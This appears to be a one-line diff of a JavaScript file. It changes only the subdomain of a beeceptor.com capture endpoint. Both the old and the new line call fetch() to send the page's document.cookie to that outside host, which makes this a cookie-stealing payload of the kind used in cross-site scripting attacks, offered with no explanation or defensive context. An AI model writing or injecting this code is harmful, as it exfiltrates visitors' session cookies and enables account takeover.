@@ -1,1 +1,1 @@
-fetch('https://testqss.free.beeceptor.com/cookie?='.concat(document.cookie));
+fetch('https://testse.free.beeceptor.com/cookie?='.concat(document.cookie));
